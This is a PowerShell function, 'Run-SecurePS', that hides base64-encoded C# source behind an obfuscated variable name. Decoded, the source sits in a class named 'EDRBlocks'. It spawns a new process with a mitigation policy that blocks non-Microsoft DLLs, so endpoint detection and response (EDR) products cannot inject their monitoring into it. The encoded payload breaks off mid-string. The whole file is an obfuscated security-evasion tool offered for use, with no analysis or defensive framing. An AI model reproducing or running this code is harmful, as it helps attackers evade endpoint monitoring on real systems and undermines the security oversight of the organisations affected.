function Run-SecurePS
{
Param
    (
        [string]
        $argument
    )
${/===\________/==\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIAB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AA0ACgAgACAAIAAgAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzADsADQAKACAAIAAgACAAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAIAAgACAAIAANAAoAIAAgACAAIABuAGEAbQBlAHMAcABhAGMAZQAgAFAAbABlAGEAcwBlAE4AbwANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABFAEQAUgBCAGwAbwBjAGsAcwANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIAB2AG8AaQBkACAATQBhAGkAbgAoAHAAYQByAGEAbQBzACAAcwB0AHIAaQBuAGcAWwBdACAAYQByAGcAcwApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHYAYQByACAAcwB0AGEAcgB0AEkAbgBmAG8ARQB4ACAAPQAgAG4AZQB3ACAAVwBpAG4AMwAyAC4AUwBUAEEAUgBUAFUAUABJAE4ARgBPAEUAWAAoACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAHAAcgBvAGMAZQBzAHMASQBuAGYAbwAgAD0AIABuAGUAdwAgAFcAaQBuADMAMgAuAFAAUgBPAEMARQBTAFMAXwBJAE4ARgBPAFIATQBBAFQASQBPAE4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwB0AGEAcgB0AEkAbgBmAG8ARQB4AC4AUwB0AGEAcgB0AHUAcABJAG4AZgBvAC4AYwBiACAAPQAgACgAdQBpAG4AdAApAE0AYQByAHMAaABhAGwALgBTAGkAegBlAE8AZgAoAHMAdABhAHIAdABJAG4AZgBvAEUAeAApADsADQAKACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdgBhAHIAIABsAHAAVgBhAGwAdQBlACAAPQAgAE0AYQByAHMAaABhAGwALgBBAGwAbABvAGMASABHAGwAbwBiAGEAbAAoAEkAbgB0AFAAdAByAC4AUwBpAHoAZQApADsADQAKACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAByAHkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHYAYQByACAAcAByAG8AYwBlAHMAcwBTAGUAYwB1AHIAaQB0AHkAIAA9ACAAbgBlAHcAIABXAGkAbgAzADIALgBTAEUAQwBVAFIASQBUAFkAXwBBAFQAVABSAEkAQgBVAFQARQBTACgAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdgBhAHIAIAB0AGgAcgBlAGEAZABTAGUAYwB1AHIAaQB0AHkAIAA9ACAAbgBlAHcAIABXAGkAbgAzADIALgBTAEUAQwBVAFIASQBUAFkAXwBBAFQAVABSAEkAQgBVAFQARQBTACgAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAByAG8AYwBlAHMAcwBTAGUAYwB1AHIAaQB0AHkALgBuAEwAZQBuAGcAdABoACAAPQAgAE0AYQByAHMAaABhAGwALgBTAGkAegBlAE8AZgAoAHAAcgBvAGMAZQBzAHMAUwBlAGMAdQByAGkAdAB5ACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAaAByAGUAYQBkAFMAZQBjAHUAcgBpAHQAeQAuAG4ATABlAG4AZwB0AGgAIAA9ACAATQBhAHIAcwBoAGEAbAAuAFMAaQB6AGUATwBmACgAdABoAHIAZQBhAGQAUwBlAGMAdQByAGkAdAB5ACkAOwANAAoAIAAgACAAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHYAYQByACAAbABwAFMAaQB6AGUAIAA9ACAASQBuAHQAUAB0AHIALgBaAGUAcgBvADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAGkAbgAzADIALgBJAG4AaQB0AGkAYQBsAGkAegBlAFAAcgBvAGMAVABoAHIAZQBhAGQAQQB0AHQAcgBpAGIAdQB0AGUATABpAHMAdAAoAEkAbgB0AFAAdAByAC4AWgBlAHIAbwAsACAAMgAsACAAMAAsACAAcgBlAGYAIABsAHAAUwBpAHoAZQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAHQAYQByAHQASQBuAGYAbwBFAHgALgBsAHAAQQB0AHQAcgBpAGIAdQB0AGUATABpAHMAdAAgAD0AIABNAGEAcgBzAGgAYQBsAC4AQQBsAGwAbwBjAEgARwBsAG8AYgBhAGwAKABsAHAAUwBpAHoAZQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAGkAbgAzADIALgBJAG4AaQB0AGkAYQBsAGkAegBlAFAAcgBvAGMAVABoAHIAZQBhAGQAQQB0AHQAcgBpAGIAdQB0AGUATABpAHMAdAAoAHMAdABhAHIAdABJAG4AZgBvAEUAeAAuAGwAcABBAHQAdAByAGkAYgB1AHQAZQBMAGkAcwB0ACwAIAAyACwAIAAwACwAIAByAGUAZgAgAGwAcABTAGkAegBlACkAOwANAAoAIAAgACAAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE0AYQByAHMAaABhAGwALgBXAHIAaQB0AGUASQBuAHQAUAB0AHIAKABsAHAAVgBhAGwAdQBlACwAIABuAGUAdwAgAEkAbgB0AFAAdAByACgAKABsAG8AbgBnACkAVwBpAG4AMwAyAC4AQgBpAG4AYQByAHkAUwBpAGcAbgBhAHQAdQByAGUAUABvAGwAaQBjAHkALgBCAEwATwBDAEsAXwBOAE8ATgBfAE0ASQBDAFIATwBTAE8ARgBUAF8AQgBJAE4AQQBSAEkARQBTAF8AQQBMAFcAQQBZAFMAXwBPAE4AKQApADsADQAKACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAGkAbgAzADIALgBVAHAAZABhAHQAZQBQAHIAbwBjAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlACgADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAdABhAHIAdABJAG4AZgBvAEUAeAAuAGwAcABBAHQAdAByAGkAYgB1AHQAZQBMAGkAcwB0ACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADAALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAKABJAG4AdABQAHQAcgApAFcAaQBuADMAMgAuAFAAcgBvAGMAVABoAHIAZQBhAGQAQQB0AHQAcgBpAGIAdQB0AGUALgBNAEkAVABJAEcAQQBUAEkATwBOAF8AUABPAEwASQBDAFkALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbABwAFYAYQBsAHUAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAoAEkAbgB0AFAAdAByACkASQBuAHQAUAB0AHIALgBTAGkAegBlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEkAbgB0AFAAdAByAC4AWgBlAHIAbwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgAuAFoAZQByAG8ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACkAOwANAAoAIAAgACAAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAaQBuADMAMgAuAEMAcgBlAGEAdABlAFAAcgBvAGMAZQBzAHMAKAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQByAGcAcwBbADAAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAHIAZwBzAFsAMQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHIAZQBmACAAcAByAG8AYwBlAHMAcwBTAGUAYwB1AHIAaQB0AHkALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAGYAIAB0AGgAcgBlAGEAZABTAGUAYwB1AHIAaQB0AHkALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAZgBhAGwAcwBlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAaQBuADMAMgAuAEMAcgBlAGEAdABpAG8AbgBGAGwAYQBnAHMALgBFAHgAdABlAG4AZABlAGQAUwB0AGEAcgB0AHUAcABJAG4AZgBvAFAAcgBlAHMAZQBuAHQAIAB8ACAAVwBpAG4AMwAyAC4AQwByAGUAYQB0AGkAbwBuAEYAbABhAGcAcwAuAEMAcgBlAGEAdABlAE4AZQB3AEMAbwBuAHMAbwBsAGUALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBuAHQAUAB0AHIALgBaAGUAcgBvACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG4AdQBsAGwALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAGYAIABzAHQAYQByAHQASQBuAGYAbwBFAHgALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbwB1AHQAIABwAHIAbwBjAGUAcwBzAEkAbgBmAG8ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGMAYQB0AGMAaAAgACgARQB4AGMAZQBwAHQAaQBvAG4AIABlACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEMAbwBuAHMAbwBsAGUALgBFAHIAcgBvAHIALgBXAHIAaQB0AGUATABpAG4AZQAoAGUALgBTAHQAYQBjAGsAVAByAGEAYwBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGYAaQBuAGEAbABsAHkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAaQBuADMAMgAuAEQAZQBsAGUAdABlAFAAcgBvAGMAVABoAHIAZQBhAGQAQQB0AHQAcgBpAGIAdQB0AGUATABpAHMAdAAoAHMAdABhAHIAdABJAG4AZgBvAEUAeAAuAGwAcABBAHQAdAByAGkAYgB1AHQAZQBMAGkAcwB0ACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE0AYQByAHMAaABhAGwALgBGAHIAZQBlAEgARwBsAG8AYgBhAGwAKABzAHQAYQByAHQASQBuAGYAbwBFAHgALgBsAHAAQQB0AHQAcgBpAGIAdQB0AGUATABpAHMAdAApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABNAGEAcgBzAGgAYQBsAC4ARgByAGUAZQBIAEcAbABvAGIAYQBsACgAbABwAFYAYQBsAHUAZQApADsADQAKACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABDAG8AbgBzAG8AbABlAC4AVwByAGkAdABlAEwAaQBuAGUAKAAiAE4AZQB3ACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHcAaQB0AGgAIABQAEkARAAgAHsAMAB9ACAAcwB0AGEAcgB0AGUAZAAuACIALAAgAHAAcgBvAGMAZQBzAHMASQBuAGYAbwAuAGQAdwBQAHIAbwBjAGUAcwBzAEkAZAApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIABjAGwAYQBzAHMAIABXAGkAbgAzADIADQAKACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgAgAD0AIAB0AHIAdQBlACkAXQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAEkAbgBpAHQAaQBhAGwAaQB6AGUAUAByAG8AYwBUAGgAcgBlAGEAZABBAHQAdAByAGkAYgB1AHQAZQBMAGkAcwB0ACgASQBuAHQAUAB0AHIAIABsAHAAQQB0AHQAcgBpAGIAdQB0AGUATABpAHMAdAAsACAAaQBuAHQAIABkAHcAQQB0AHQAcgBpAGIAdQB0AGUAQwBvAHUAbgB0ACwAIABpAG4AdAAgAGQAdwBGAGwAYQBnAHMALAAgAHIAZQBmACAASQBuAHQAUAB0AHIAIABsAHAAUwBpAHoAZQApADsADQAKACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByACAAPQAgAHQAcgB1AGUAKQBdAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAVQBwAGQAYQB0AGUAUAByAG8AYwBUAGgAcgBlAGEAZABBAHQAdAByAGkAYgB1AHQAZQAoAEkAbgB0AFAAdAByACAAbABwAEEAdAB0AHIAaQBiAHUAdABlAEwAaQBzAHQALAAgAHUAaQBuAHQAIABkAHcARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAEEAdAB0AHIAaQBiAHUAdABlACwAIABJAG4AdABQAHQAcgAgAGwAcABWAGEAbAB1AGUALAAgAEkAbgB0AFAAdAByACAAYwBiAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFAAcgBlAHYAaQBvAHUAcwBWAGEAbAB1AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFIAZQB0AHUAcgBuAFMAaQB6AGUAKQA7AA0ACgAgACAAIAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAEMAcgBlAGEAdABlAFAAcgBvAGMAZQBzAHMAKABzAHQAcgBpAG4AZwAgAGwAcABBAHAAcABsAGkAYwBhAHQAaQBvAG4ATgBhAG0AZQAsACAAcwB0AHIAaQBuAGcAIABsAHAAQwBvAG0AbQBhAG4AZABMAGkAbgBlACwAIAByAGUAZgAgAFMARQBDAFUAUgBJAFQAWQBfAEEAVABUAFIASQBCAFUAVABFAFMAIABsAHAAUAByAG8AYwBlAHMAcwBBAHQAdAByAGkAYgB1AHQAZQBzACwAIAByAGUAZgAgAFMARQBDAFUAUgBJAFQAWQBfAEEAVABUAFIASQBCAFUAVABFAFMAIABsAHAAVABoAHIAZQBhAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwAsACAAYgBvAG8AbAAgAGIASQBuAGgAZQByAGkAdABIAGEAbgBkAGwAZQBzACwAIABDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACAAZAB3AEMAcgBlAGEAdABpAG8AbgBGAGwAYQBnAHMALAAgAEkAbgB0AFAAdAByACAAbABwAEUAbgB2AGkAcgBvAG4AbQBlAG4AdAAsACAAcwB0AHIAaQBuAGcAIABsAHAAQwB1AHIAcgBlAG4AdABEAGkAcgBlAGMAdABvAHIAeQAsACAAWwBJAG4AXQAgAHIAZQBmACAAUwBUAEEAUgBUAFUAUABJAE4ARgBPAEUAWAAgAGwAcABTAHQAYQByAHQAdQBwAEkAbgBmAG8ALAAgAG8AdQB0ACAAUABSAE8AQwBFAFMAUwBfAEkATgBGAE8AUgBNAEEAVABJAE8ATgAgAGwAcABQAHIAbwBjAGUAcwBzAEkAbgBmAG8AcgBtAGEAdABpAG8AbgApADsADQAKACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByACAAPQAgAHQAcgB1AGUAKQBdAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAARABlAGwAZQB0AGUAUAByAG8AYwBUAGgAcgBlAGEAZABBAHQAdAByAGkAYgB1AHQAZQBMAGkAcwB0ACgASQBuAHQAUAB0AHIAIABsAHAAQQB0AHQAcgBpAGIAdQB0AGUATABpAHMAdAApADsADQAKACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsAUwB0AHIAdQBjAHQATABhAHkAbwB1AHQAKABMAGEAeQBvAHUAdABLAGkAbgBkAC4AUwBlAHEAdQBlAG4AdABpAGEAbAApAF0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AHIAdQBjAHQAIABQAFIATwBDAEUAUwBTAF8ASQBOAEYATwBSAE0AQQBUAEkATwBOAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABoAFAAcgBvAGMAZQBzAHMAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAaABUAGgAcgBlAGEAZAA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAaQBuAHQAIABkAHcAUAByAG8AYwBlAHMAcwBJAGQAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAAZAB3AFQAaAByAGUAYQBkAEkAZAA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAFMAdAByAHUAYwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUAZQBuAHQAaQBhAGwAKQBdAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdAByAHUAYwB0ACAAUwBUAEEAUgBUAFUAUABJAE4ARgBPAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAGMAYgA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABsAHAAUgBlAHMAZQByAHYAZQBkADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABJAG4AdABQAHQAcgAgAGwAcABEAGUAcwBrAHQAbwBwADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABJAG4AdABQAHQAcgAgAGwAcABUAGkAdABsAGUAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABkAHcAWAA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAGQAdwBZADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAAZAB3AFgAUwBpAHoAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAGQAdwBZAFMAaQB6AGUAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABkAHcAWABDAG8AdQBuAHQAQwBoAGEAcgBzADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAAZAB3AFkAQwBvAHUAbgB0AEMAaABhAHIAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAGQAdwBGAGkAbABsAEEAdAB0AHIAaQBiAHUAdABlAHMAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABkAHcARgBsAGEAZwBzADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIAB1AHMAaABvAHIAdAAgAHcAUwBoAG8AdwBXAGkAbgBkAG8AdwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAdQBzAGgAbwByAHQAIABjAGIAUgBlAHMAZQByAHYAZQBkADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABJAG4AdABQAHQAcgAgAGwAcABSAGUAcwBlAHIAdgBlAGQAMgA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABoAFMAdABkAEkAbgBwAHUAdAA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABoAFMAdABkAE8AdQB0AHAAdQB0ADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABJAG4AdABQAHQAcgAgAGgAUwB0AGQARQByAHIAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAWwBTAHQAcgB1AGMAdABMAGEAeQBvAHUAdAAoAEwAYQB5AG8AdQB0AEsAaQBuAGQALgBTAGUAcQB1AGUAbgB0AGkAYQBsACkAXQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAcgB1AGMAdAAgAFMAVABBAFIAVABVAFAASQBOAEYATwBFAFgADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABTAFQAQQBSAFQAVQBQAEkATgBGAE8AIABTAHQAYQByAHQAdQBwAEkAbgBmAG8AOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAbABwAEEAdAB0AHIAaQBiAHUAdABlAEwAaQBzAHQAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAWwBTAHQAcgB1AGMAdABMAGEAeQBvAHUAdAAoAEwAYQB5AG8AdQB0AEsAaQBuAGQALgBTAGUAcQB1AGUAbgB0AGkAYQBsACkAXQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAcgB1AGMAdAAgAFMARQBDAFUAUgBJAFQAWQBfAEEAVABUAFIASQBCAFUAVABFAFMADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABpAG4AdAAgAG4ATABlAG4AZwB0AGgAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAbABwAFMAZQBjAHUAcgBpAHQAeQBEAGUAcwBjAHIAaQBwAHQAbwByADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABpAG4AdAAgAGIASQBuAGgAZQByAGkAdABIAGEAbgBkAGwAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAEYAbABhAGcAcwBdAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGUAbgB1AG0AIABQAHIAbwBjAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlACAAOgAgAGkAbgB0AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE0ASQBUAEkARwBBAFQASQBPAE4AXwBQAE8ATABJAEMAWQAgAD0AIAAwAHgAMgAwADAAMAA3ACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUABBAFIARQBOAFQAXwBQAFIATwBDAEUAUwBTACAAPQAgADAAeAAwADAAMAAyADAAMAAwADAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsARgBsAGEAZwBzAF0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAZQBuAHUAbQAgAEIAaQBuAGEAcgB5AFMAaQBnAG4AYQB0AHUAcgBlAFAAbwBsAGkAYwB5ACAAOgAgAHUAbABvAG4AZwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABCAEwATwBDAEsAXwBOAE8ATgBfAE0ASQBDAFIATwBTAE8ARgBUAF8AQgBJAE4AQQBSAEkARQBTAF8AQQBMAFcAQQBZAFMAXwBPAE4AIAA9ACAAMAB4ADEAMAAwADAAMAAwADAAMAAwADAAMAAwACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQgBMAE8AQwBLAF8ATgBPAE4AXwBNAEkAQwBSAE8AUwBPAEYAVABfAEIASQBOAEEAUgBJAEUAUwBfAEEATABMAE8AVwBfAFMAVABPAFIARQAgAD0AIAAwAHgAMwAwADAAMAAwADAAMAAwADAAMAAwADAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsARgBsAGEAZwBzAF0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAAdQBiAGw